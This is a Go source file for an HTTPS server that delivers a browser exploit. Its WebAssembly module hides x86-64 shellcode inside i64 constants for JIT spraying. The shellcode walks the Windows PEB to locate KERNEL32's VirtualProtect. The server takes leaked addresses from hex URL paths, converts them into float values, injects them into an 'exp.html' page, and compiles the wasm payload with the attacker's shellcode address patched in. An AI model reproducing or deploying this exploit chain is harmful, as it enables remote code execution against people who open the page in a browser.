package main

import (
	"errors"
	"flag"
	"fmt"
	"github.com/bytecodealliance/wasmtime-go/v8"
	"io/ioutil"
	"log"
	"math"
	"net/http"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
)

var globalFloat float64 = -1

var wasm_code = `
(module
  (func $f (export "f") (param i64)
  (call $f (i64.const 0x12EB9060B0C03148)) ;; 48 31 C0 B0 60 90 EB 12    12EB9060B0C03148
  (call $f (i64.const 0x0BEB9090008B4865)) ;; 65 48 8B 00 90 90 EB 0B    0BEB9090008B4865
  (call $f (i64.const 0x0BEB909018408B48)) ;; 48 8B 40 18 90 90 EB 0B    0BEB909018408B48
  (call $f (i64.const 0x0BEB909030408B48)) ;; 48 8B 40 30 90 90 EB 0B    0BEB909030408B48
  (call $f (i64.const 0x0BEBc08b48C08548)) ;; 48 85 C0 48 8b c0 EB 0B    0BEBc08b48C08548
  (call $f (i64.const 0x0BEB000002D1840F)) ;; 0F 84 D1 02 00 00 EB 0B    0BEB000002D1840F
  (call $f (i64.const 0x0BEB9000320033BA)) ;; BA 33 00 32 00 90 EB 0B    0BEB9000320033BA
  (call $f (i64.const 0x0BEB909020E2C148)) ;; 48 C1 E2 20 90 90 EB 0B    0BEB909020E2C148
  (call $f (i64.const 0x0BEB90004C0045B9)) ;; B9 45 00 4C 00 90 EB 0B    0BEB90004C0045B9
  (call $f (i64.const 0x0BEBdb8b48CA0148)) ;; 48 01 CA 48 8b db EB 0B    0BEBdb8b48CA0148
  (call $f (i64.const 0x0BEB004E0052B941)) ;; 41 B9 52 00 4E 00 EB 0B    0BEB004E0052B941
  (call $f (i64.const 0x0BEB909020E1C149)) ;; 49 C1 E1 20 90 90 EB 0B    0BEB909020E1C149
  (call $f (i64.const 0x0BEB900045004BB9)) ;; B9 4B 00 45 00 90 EB 0B    0BEB900045004BB9
  (call $f (i64.const 0x0BEBc98b48C90149)) ;; 49 01 C9 48 8b c9 EB 0B    0BEBc98b48C90149
  (call $f (i64.const 0x0BEB004C004CB841)) ;; 41 B8 4C 00 4C 00 EB 0B    0BEB004C004CB841
  (call $f (i64.const 0x0BEB909020E0C149)) ;; 49 C1 E0 20 90 90 EB 0B    0BEB909020E0C149
  (call $f (i64.const 0x0BEB900044002EB9)) ;; B9 2E 00 44 00 90 EB 0B    0BEB900044002EB9
  (call $f (i64.const 0x0BEBf68b48C80149)) ;; 49 01 C8 48 8b f6 EB 0B    0BEBf68b48C80149
  (call $f (i64.const 0x0BEB909040488B48)) ;; 48 8B 48 40 90 90 EB 0B    0BEB909040488B48
  (call $f (i64.const 0x0BEB904774C98548)) ;; 48 85 C9 74 47 90 EB 0B    0BEB904774C98548
  (call $f (i64.const 0x0BEB90347509394C)) ;; 4C 39 09 75 34 90 EB 0B    0BEB90347509394C
  (call $f (i64.const 0x0BEB207508513948)) ;; 48 39 51 08 75 20 EB 0B    0BEB207508513948
  (call $f (i64.const 0x0BEB22741041394C)) ;; 4C 39 41 10 74 22 EB 0B    0BEB22741041394C
  (call $f (i64.const 0x0BEBC08548008B48)) ;; 48 8B 00 48 85 C0 EB 0B    0BEBC08548008B48
  (call $f (i64.const 0x0BEB10488B488C75)) ;; 75 8C 48 8B 48 10 EB 0B    0BEB10488B488C75
  (call $f (i64.const 0x0BEB90903C416348)) ;; 48 63 41 3C 90 90 EB 0B    0BEB90903C416348
  (call $f (i64.const 0x0BEBC80148C98949)) ;; 49 89 C9 48 01 C8 EB 0B    0BEBC80148C98949
  (call $f (i64.const 0x0BEB000000880548)) ;; 48 05 88 00 00 00 EB 0B    0BEB000000880548
  (call $f (i64.const 0x0BEB9090C031108B)) ;; 8B 10 31 C0 90 90 EB 0B    0BEB9090C031108B
  (call $f (i64.const 0x0BEBff8b48CA0148)) ;; 48 01 CA 48 8b ff EB 0B    0BEBff8b48CA0148
  (call $f (i64.const 0x0BEB909018528B44)) ;; 44 8B 52 18 90 90 EB 0B    0BEB909018528B44
  (call $f (i64.const 0x0BEB909020428B44)) ;; 44 8B 42 20 90 90 EB 0B    0BEB909020428B44
  (call $f (i64.const 0x0BEB9090245A8B44)) ;; 44 8B 5A 24 90 90 EB 0B    0BEB9090245A8B44
  (call $f (i64.const 0x0BEB1c528bC80149)) ;; 49 01 C8 8b 52 1c EB 0B    0BEB1c528bC80149
  (call $f (i64.const 0x0BEBCA0148CB0149)) ;; 49 01 CB 48 01 CA EB 0B    0BEBCA0148CB0149
  (call $f (i64.const 0x0BEBc98b4dD28545)) ;; 45 85 D2 4d 8b c9 EB 0B    0BEBc98b4dD28545
  (call $f (i64.const 0x0BEB00000092840F)) ;; 0F 84 92 00 00 00 EB 0B    0BEB00000092840F
  (call $f (i64.const 0x0BEB90506C6175BB)) ;; BB 75 61 6C 50 90 EB 0B    0BEB90506C6175BB
  (call $f (i64.const 0x0BEB909020E3C148)) ;; 48 C1 E3 20 90 90 EB 0B    0BEB909020E3C148
  (call $f (i64.const 0x0BEB9074726956BE)) ;; BE 56 69 72 74 90 EB 0B    0BEB9074726956BE
  (call $f (i64.const 0x0BEB088B41F30148)) ;; 48 01 F3 41 8B 08 EB 0B    0BEB088B41F30148
  (call $f (i64.const 0x0BEB4674091C394A)) ;; 4A 39 1C 09 74 46 EB 0B    0BEB4674091C394A
  (call $f (i64.const 0x0BEB04C08349C0FF)) ;; FF C0 49 83 C0 04 EB 0B    0BEB04C08349C0FF
  (call $f (i64.const 0x0BEB90C572D03944)) ;; 44 39 D0 72 C5 90 EB 0B    0BEB90C572D03944
  (call $f (i64.const 0x0BEBd28b4dC3C031)) ;; 31 C0 C3 4d 8b d2 EB 0B    0BEBd28b4dC3C031
  (call $f (i64.const 0x0BEB904304B70F41)) ;; 41 0F B7 04 43 90 EB 0B    0BEB904304B70F41
  (call $f (i64.const 0x0BEB9008245C8B48)) ;; 48 8B 5C 24 08 90 EB 0B    0BEB9008245C8B48
  (call $f (i64.const 0x0BEBC8014C82048B)) ;; 8B 04 82 4C 01 C8 EB 0B    0BEBC8014C82048B

  (call $f (i64.const 0x0BEB909090C68948)) ;; 48 89 C6 90 90 90 EB 0B    0BEB909090C68948
  (call $f (i64.const 0x0BEB9000002000BA)) ;; BA 00 20 00 00 90 EB 0B    0BEB9000002000BA
  (call $f (i64.const 0x0BEB00000040B841)) ;; 41 B8 40 00 00 00 EB 0B    0BEB00000040B841
  (call $f (i64.const 0x0BEB90AABBCCDDB8)) ;; B8 DD CC BB AA 90 EB 0B    0BEB90AABBCCDDB8
  (call $f (i64.const 0x0BEB909050F0014C)) ;; 4C 01 F0 50 50 90 EB 0B    0BEB909050F0014C
  (call $f (i64.const 0x0BEB909090C18948)) ;; 48 89 C1 90 90 90 EB 0B    0BEB909090C18948
  (call $f (i64.const 0x0BEB000019000548)) ;; 48 05 00 19 00 00 EB 0B    0BEB000019000548
  (call $f (i64.const 0x0BEB90E6FFC18949)) ;; 49 89 C1 FF E6 90 EB 0B    0BEB90E6FFC18949
)) 
`

func faviconHandler(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "favicon.ico")
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}
func isValidAddress(str string) bool {
	match, _ := regexp.MatchString("^[0-9a-fA-F]{1,8}$", str)
	return match
}

func processShellcodeAddr(str string, code string) (string, error) {
	if !isValidAddress(str) {
		fmt.Println("ShellcodeAddr地址无效")
		return "", errors.New("ShellcodeAddr地址无效")
	}
	code = strings.Replace(code, "0x0BEB90AABBCCDDB8", "0x0BEB90"+str+"B8", 1)
	return code, nil
}
func fileServerHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Println(r.URL.Path)
	p := "." + r.URL.Path
	extName := path.Ext(r.URL.Path)
	// 获取路径的最后一部分
	base := path.Base(r.URL.Path)
	// 检查它是否全部由0-9或a-f组成
	match, _ := regexp.MatchString("^[0-9a-f]+$", base)
	if match {
		fmt.Println("Matched string:", base)
		// 解析十六进制字符串为整数
		i, err := strconv.ParseInt(base, 16, 64)
		if err != nil {
			log.Println("Error parsing hex string:", err)
			http.ServeFile(w, r, p)
			return
		}
		// 获得i的高4个字节并减去0x10
		high4Bytes := int64(uint64(i)>>32) - 0x10

		// 确保减法操作不会使值变为负数
		if high4Bytes < 0 {
			high4Bytes = 0
		}

		// 用新值替换i的高4个字节
		i = (high4Bytes << 32) | (i & 0xFFFFFFFF)
		// 解析整数为浮点数
		globalFloat = math.Float64frombits(uint64(i))
		// 打印浮点数
		fmt.Println("Float: ", globalFloat)
		// Send an empty response
		w.WriteHeader(http.StatusOK)
		return
	}
	if base == "exp.html" {
		if globalFloat == -1 {
			fmt.Fprint(w, `
			<!DOCTYPE html>
			<html>
			<head>
				<title>Refresh Page</title>
			</head>
			<body>
				<script>setTimeout(function(){ location.reload(); }, 1000);</script>
				<p>Loading...</p>
			</body>
			</html>
			`)
			return
		}
		content, err := ioutil.ReadFile(p)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		newContent := strings.Replace(string(content), "xxx", fmt.Sprint(globalFloat), -1)
		fmt.Println("New content: ", newContent)
		fmt.Fprint(w, newContent)
		globalFloat = -1
		return
	}
	// fmt.Println(extName)
	if extName == ".wasm" {
		// 去掉扩展名
		nameWithoutExt := strings.TrimSuffix(r.URL.Path, filepath.Ext(r.URL.Path))
		// 去掉前面的"/"
		baseName := filepath.Base(nameWithoutExt)
		fmt.Printf(baseName)
		wasmCodeOk, err := processShellcodeAddr(baseName, wasm_code)
		if err != nil {
			fmt.Println("发生错误：", err)
			panic("处理ShellcodeAddr发生错误")
		}
		fmt.Println(wasmCodeOk)
		wasm, err := wasmtime.Wat2Wasm(wasmCodeOk)
		if err != nil {
			fmt.Printf("error converting wat to wasm: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("编译结束")

		w.Header().Set("Content-Type", "application/wasm")
		_, err = w.Write([]byte(wasm))
		check(err)
		w.(http.Flusher).Flush()
		fmt.Printf("flushOK")
		return
	}
	http.ServeFile(w, r, p)
}
func main() {
	port := flag.String("p", "443", "port to serve on")
	directory := flag.String("d", ".", "the directory of static file to host")
	flag.Parse()
	fmt.Printf("path %s\n", *directory)
	http.HandleFunc("/favicon.ico", faviconHandler)
	http.HandleFunc("/", fileServerHandler)
	log.Printf("Begin Serving %s on HTTP port: %s\n", *directory, *port)
	log.Fatal(http.ListenAndServeTLS(":443", "server.pem", "key.pem", nil))
}
